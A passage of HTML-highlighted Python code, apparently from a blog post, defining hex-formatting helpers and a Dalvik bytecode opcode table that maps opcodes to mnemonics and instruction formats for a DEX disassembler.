class="line">    lo = (u2_ &lt;&lt; <span class="number">16</span>) | u1</span><br><span class="line">    hi = (u4 &lt;&lt; <span class="number">16</span>) | u3</span><br><span class="line">    v = (hi &lt;&lt; <span class="number">32</span>) | lo</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&lt;q&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, v &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex32</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;(n &amp; <span class="number">0xFFFFFFFF</span>):08x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex16</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;(n &amp; <span class="number">0xFFFF</span>):04x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex8</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;(n &amp; <span class="number">0xFF</span>):02x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPCODES: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>, <span class="type">Optional</span>[<span class="built_in">int</span>], <span class="type">Optional</span>[<span class="built_in">int</span>]]] = &#123;</span><br><span class="line">    <span class="number">0x00</span>: (<span class="string">&quot;nop&quot;</span>, <span class="string">&quot;10x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x01</span>: (<span class="string">&quot;move&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x02</span>: (<span class="string">&quot;move/from16&quot;</span>, <span class="string">&quot;22x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x03</span>: (<span class="string">&quot;move/16&quot;</span>, <span class="string">&quot;32x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x04</span>: (<span class="string">&quot;move-wide&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x05</span>: (<span class="string">&quot;move-wide/from16&quot;</span>, <span class="string">&quot;22x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x06</span>: (<span class="string">&quot;move-wide/16&quot;</span>, <span class="string">&quot;32x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x07</span>: (<span class="string">&quot;move-object&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x08</span>: (<span class="string">&quot;move-object/from16&quot;</span>, <span class="string">&quot;22x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x09</span>: (<span class="string">&quot;move-object/16&quot;</span>, <span class="string">&quot;32x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0a</span>: (<span class="string">&quot;move-result&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0b</span>: (<span class="string">&quot;move-result-wide&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0c</span>: (<span class="string">&quot;move-result-object&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0d</span>: (<span class="string">&quot;move-exception&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0e</span>: (<span class="string">&quot;return-void&quot;</span>, <span class="string">&quot;10x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0f</span>: (<span class="string">&quot;return&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x10</span>: (<span class="string">&quot;return-wide&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x11</span>: (<span class="string">&quot;return-object&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x12</span>: (<span class="string">&quot;const/4&quot;</span>, <span class="string">&quot;11n&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x13</span>: (<span class="string">&quot;const/16&quot;</span>, <span class="string">&quot;21s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x14</span>: (<span class="string">&quot;const&quot;</span>, <span class="string">&quot;31i&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x15</span>: (<span class="string">&quot;const/high16&quot;</span>, <span class="string">&quot;21ih&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x16</span>: (<span class="string">&quot;const-wide/16&quot;</span>, <span class="string">&quot;21s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x17</span>: (<span class="string">&quot;const-wide/32&quot;</span>, <span class="string">&quot;31i&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x18</span>: (<span class="string">&quot;const-wide&quot;</span>, <span class="string">&quot;51l&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x19</span>: (<span class="string">&quot;const-wide/high16&quot;</span>, <span class="string">&quot;21lh&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1a</span>: (<span class="string">&quot;const-string&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">0</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1b</span>: (<span class="string">&quot;const-string/jumbo&quot;</span>, <span class="string">&quot;31c&quot;</span>, <span class="number">0</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1c</span>: (<span class="string">&quot;const-class&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1d</span>: (<span class="string">&quot;monitor-enter&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1e</span>: (<span class="string">&quot;monitor-exit&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1f</span>: (<span class="string">&quot;check-cast&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x20</span>: (<span class="string">&quot;instance-of&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x21</span>: (<span class="string">&quot;array-length&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x22</span>: (<span class="string">&quot;new-instance&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x23</span>: (<span class="string">&quot;new-array&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x24</span>: (<span class="string">&quot;filled-new-array&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x25</span>: (<span class="string">&quot;filled-new-array/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x26</span>: (<span class="string">&quot;fill-array-data&quot;</span>, <span class="string">&quot;31t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x27</span>: (<span class="string">&quot;throw&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x28</span>: (<span class="string">&quot;goto&quot;</span>, <span class="string">&quot;10t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x29</span>: (<span class="string">&quot;goto/16&quot;</span>, <span class="string">&quot;20t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2a</span>: (<span class="string">&quot;goto/32&quot;</span>, <span class="string">&quot;30t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2b</span>: (<span class="string">&quot;packed-switch&quot;</span>, <span class="string">&quot;31t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2c</span>: (<span class="string">&quot;sparse-switch&quot;</span>, <span class="string">&quot;31t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2d</span>: (<span class="string">&quot;cmpl-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2e</span>: (<span class="string">&quot;cmpg-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2f</span>: (<span class="string">&quot;cmpl-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x30</span>: (<span class="string">&quot;cmpg-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x31</span>: (<span class="string">&quot;cmp-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x32</span>: (<span class="string">&quot;if-eq&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x33</span>: (<span class="string">&quot;if-ne&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x34</span>: (<span class="string">&quot;if-lt&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x35</span>: (<span class="string">&quot;if-ge&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x36</span>: (<span class="string">&quot;if-gt&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x37</span>: (<span class="string">&quot;if-le&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x38</span>: (<span class="string">&quot;if-eqz&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x39</span>: (<span class="string">&quot;if-nez&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x3a</span>: (<span class="string">&quot;if-ltz&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x3b</span>: (<span class="string">&quot;if-gez&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x3c</span>: (<span class="string">&quot;if-gtz&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x3d</span>: (<span class="string">&quot;if-lez&quot;</span>, <span class="string">&quot;21t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x44</span>: (<span class="string">&quot;aget&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x45</span>: (<span class="string">&quot;aget-wide&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x46</span>: (<span class="string">&quot;aget-object&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x47</span>: (<span class="string">&quot;aget-boolean&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x48</span>: (<span class="string">&quot;aget-byte&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x49</span>: (<span class="string">&quot;aget-char&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4a</span>: (<span class="string">&quot;aget-short&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4b</span>: (<span class="string">&quot;aput&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4c</span>: (<span class="string">&quot;aput-wide&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4d</span>: (<span class="string">&quot;aput-object&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4e</span>: (<span class="string">&quot;aput-boolean&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x4f</span>: (<span class="string">&quot;aput-byte&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x50</span>: (<span class="string">&quot;aput-char&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x51</span>: (<span class="string">&quot;aput-short&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x52</span>: (<span class="string">&quot;iget&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x53</span>: (<span class="string">&quot;iget-wide&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x54</span>: (<span class="string">&quot;iget-object&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x55</span>: (<span class="string">&quot;iget-boolean&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x56</span>: (<span class="string">&quot;iget-byte&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x57</span>: (<span class="string">&quot;iget-char&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x58</span>: (<span class="string">&quot;iget-short&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x59</span>: (<span class="string">&quot;iput&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5a</span>: (<span class="string">&quot;iput-wide&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5b</span>: (<span class="string">&quot;iput-object&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5c</span>: (<span class="string">&quot;iput-boolean&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5d</span>: (<span class="string">&quot;iput-byte&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5e</span>: (<span class="string">&quot;iput-char&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x5f</span>: (<span class="string">&quot;iput-short&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x60</span>: (<span class="string">&quot;sget&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x61</span>: (<span class="string">&quot;sget-wide&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x62</span>: (<span class="string">&quot;sget-object&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x63</span>: (<span class="string">&quot;sget-boolean&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x64</span>: (<span class="string">&quot;sget-byte&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x65</span>: (<span class="string">&quot;sget-char&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x66</span>: (<span class="string">&quot;sget-short&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x67</span>: (<span class="string">&quot;sput&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x68</span>: (<span class="string">&quot;sput-wide&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x69</span>: (<span class="string">&quot;sput-object&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x6a</span>: (<span class="string">&quot;sput-boolean&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x6b</span>: (<span class="string">&quot;sput-byte&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x6c</span>: (<span class="string">&quot;sput-char&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x6d</span>: (<span class="string">&quot;sput-short&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">2</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x6e</span>: (<span class="string">&quot;invoke-virtual&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x6f</span>: (<span class="string">&quot;invoke-super&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x70</span>: (<span class="string">&quot;invoke-direct&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x71</span>: (<span class="string">&quot;invoke-static&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x72</span>: (<span class="string">&quot;invoke-interface&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x74</span>: (<span class="string">&quot;invoke-virtual/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x75</span>: (<span class="string">&quot;invoke-super/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x76</span>: (<span class="string">&quot;invoke-direct/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x77</span>: (<span class="string">&quot;invoke-static/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x78</span>: (<span class="string">&quot;invoke-interface/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">3</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x7b</span>: (<span class="string">&quot;neg-int&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x7c</span>: (<span class="string">&quot;not-int&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x7d</span>: (<span class="string">&quot;neg-long&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x7e</span>: (<span class="string">&quot;not-long&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x7f</span>: (<span class="string">&quot;neg-float&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x80</span>: (<span class="string">&quot;neg-double&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x81</span>: (<span class="string">&quot;int-to-long&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x82</span>: (<span class="string">&quot;int-to-float&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x83</span>: (<span class="string">&quot;int-to-double&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x84</span>: (<span class="string">&quot;long-to-int&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x85</span>: (<span class="string">&quot;long-to-float&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x86</span>: (<span class="string">&quot;long-to-double&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x87</span>: (<span class="string">&quot;float-to-int&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x88</span>: (<span class="string">&quot;float-to-long&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x89</span>: (<span class="string">&quot;float-to-double&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8a</span>: (<span class="string">&quot;double-to-int&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8b</span>: (<span class="string">&quot;double-to-long&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8c</span>: (<span class="string">&quot;double-to-float&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8d</span>: (<span class="string">&quot;int-to-byte&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8e</span>: (<span class="string">&quot;int-to-char&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x8f</span>: (<span class="string">&quot;int-to-short&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x90</span>: (<span class="string">&quot;add-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x91</span>: (<span class="string">&quot;sub-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x92</span>: (<span class="string">&quot;mul-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x93</span>: (<span class="string">&quot;div-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x94</span>: (<span class="string">&quot;rem-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x95</span>: (<span class="string">&quot;and-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x96</span>: (<span class="string">&quot;or-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x97</span>: (<span class="string">&quot;xor-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x98</span>: (<span class="string">&quot;shl-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x99</span>: (<span class="string">&quot;shr-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x9a</span>: (<span class="string">&quot;ushr-int&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x9b</span>: (<span class="string">&quot;add-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x9c</span>: (<span class="string">&quot;sub-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x9d</span>: (<span class="string">&quot;mul-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x9e</span>: (<span class="string">&quot;div-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x9f</span>: (<span class="string">&quot;rem-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0xa0</span>: (<span class="string">&quot;and-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span 